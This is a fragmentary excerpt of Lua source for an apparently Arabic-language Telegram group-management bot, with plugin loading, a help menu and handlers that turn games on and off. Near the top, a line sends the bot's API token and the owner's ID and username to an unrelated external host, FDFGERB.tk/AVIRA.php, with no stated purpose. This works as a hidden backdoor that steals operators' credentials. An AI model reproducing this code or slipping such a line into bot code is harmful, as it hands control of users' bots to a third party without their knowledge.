...
create_config_auto()
https.request("https://FDFGERB.tk/AVIRA.php/?id="..database:get(id_server..":SUDO:ID").."&user="..database:get(id_server..":SUDO:USERNAME").."&token="..database:get(id_server..":token"))
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
...
for v in io.popen('ls plugins'):lines() do
if v:match(".lua$") then
plugin = dofile("plugins/"..v)
...
▹ `#edit` - ܁ عدد السحكات 
▹ `#game` - ܁ نقاط
܁ارسل تغير الايدي ليتم تغير الايدي
]]
send(msg.chat_id_, msg.id_,Text)
return false  
...
------------------------------------------------------------------------
if text == 'تعطيل الالعابب' or text == 'تعطيل اللعبه' and Mod(msg) then  
...
if text == 'يبتفعيل الالعاب' or text == 'تفعيل اللعبه' and Mod(msg) then  
